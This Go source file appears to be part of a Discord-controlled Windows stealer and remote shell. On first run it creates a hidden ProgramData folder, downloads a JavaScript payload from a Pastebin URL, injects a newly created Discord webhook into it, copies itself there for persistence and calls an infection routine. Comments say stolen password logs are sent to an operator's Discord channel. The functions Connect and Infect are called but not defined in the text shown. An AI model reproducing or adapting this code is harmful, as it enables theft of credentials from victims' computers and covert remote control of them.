package main

import (
	"bytes"
	"encoding/json"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

type WebhookPost struct {
	Name string `json:"name"`
}

var webhook string = "webhook" // It should create a new one every time but just in case
var Token string = "Bot token" // DONT CHANGE THE "Bot" ONLY THE TOKEN PART
var Username string = os.Getenv("username")
var channelID string = "channelid" // Channel you want the password logs to come in
var guildID string = "guildid"     // Guild you want the bot to create channels
// ADD THE BOT TO THE GUILD WITH ADMIN PERMS

func FirsTime() bool {
	pgdata := os.Getenv("programdata")
	if _, err := os.Stat(pgdata + "\\SHELLD"); err == nil {
		return false
	} else {
		return true
	}
}
func main() {
	// w32.ShowWindow(w32.GetConsoleWindow(), 0)
	if FirsTime() {
		Setup()
	}
	Connect(Token)

	// for i := 0; i < 1; i-- {
	// 	time.Sleep(time.Second * 5)
	// 	fmt.Println("Hello")
	// }
}

func Setup() {

	pgdata := os.Getenv("programdata")
	os.Mkdir(pgdata+"\\SHELLD", 0644)
	res, err := http.Get("https://pastebin.com/raw/gpbJuZ4v")
	if err != nil {
		return
	}
	defer res.Body.Close()
	body, err := ioutil.ReadAll(res.Body)
	wh := NewWebhook()
	stringbody := strings.Replace(string(body), "%WEBHOOK_LINK%", wh, 1)
	if err != nil {
		return
	}
	f, err := os.OpenFile(pgdata+"\\SHELLD\\index.js", os.O_CREATE|os.O_WRONLY, 0644)
	f.Write([]byte(stringbody))
	os.Mkdir(pgdata+"\\SHELLD\\Perm", 0644)
	thisFile, _ := os.Executable()
	copyy(thisFile, pgdata+"\\SHELLD\\ShellDependent.exe")
	Infect()
}

func NewWebhook() string {
	type WebhookResponse struct {
		ID    string `json:"id"`
		Token string `json:"token"`
	}
	whData := WebhookPost{
		Name: Username,
	}
	postData, err := json.Marshal(whData)
	req, err := http.NewRequest("POST", "https://discord.com/api/channels/"+channelID+"/webhooks", bytes.NewBuffer(postData))
	if err != nil {
		return webhook
	}
	req.Header.Add("Authorization", Token)
	req.Header.Add("Content-Type", "application/json")
	client := &http.Client{}
	res, err := client.Do(req)
	if err != nil {
		return webhook
	}
	defer res.Body.Close()
	data, err := ioutil.ReadAll(res.Body)
	if res.StatusCode == 200 {
		if err != nil {
			return webhook
		}
		var Webhook WebhookResponse
		err = json.Unmarshal(data, &Webhook)
		if err != nil {
			return webhook
		}
		return "https://discord.com/api/webhooks/" + Webhook.ID + "/" + Webhook.Token
	} else {
		return webhook
	}
}

func copyy(src, dst string) (int64, error) {
	sourceFileStat, err := os.Stat(src)
	if err != nil {
		return 0, err
	}

	if !sourceFileStat.Mode().IsRegular() {
		return 0, err
	}

	source, err := os.Open(src)
	if err != nil {
		return 0, err
	}
	defer source.Close()

	destination, err := os.Create(dst)
	if err != nil {
		return 0, err
	}
	defer destination.Close()
	nBytes, err := io.Copy(destination, source)
	return nBytes, err
}
